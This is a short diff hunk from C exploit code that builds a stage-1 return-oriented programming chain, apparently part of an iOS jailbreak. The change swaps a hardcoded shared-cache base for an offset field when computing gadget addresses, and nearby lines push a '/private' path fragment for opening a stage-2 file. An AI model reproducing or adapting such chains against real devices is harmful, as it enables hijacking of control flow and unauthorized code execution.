@@ -257,7 +257,7 @@ void generate_stage1_rop_chain(offset_struct_t* offsets)
     ADD_CODE_GADGET(offsets->BEAST_GADGET); // 0x128		[3] x30 (next gadget)
 #endif
 
-#define ADD_UNSLID_CODE_GADGET(code_addr) ADD_STATIC_GADGET(code_addr - 0x180000000 + offsets->new_cache_addr)
+#define ADD_UNSLID_CODE_GADGET(code_addr) ADD_STATIC_GADGET(code_addr - offsets->old_cache_addr + offsets->new_cache_addr)
     // we can now use the stack cache for the other calls and now we will open stage 2 to get a file descriptor
     ADD_GADGET(); // 0x130		[3] new stack top
     ADD_STATIC_GADGET(0x657461766972702f); // 0x138				(/private)
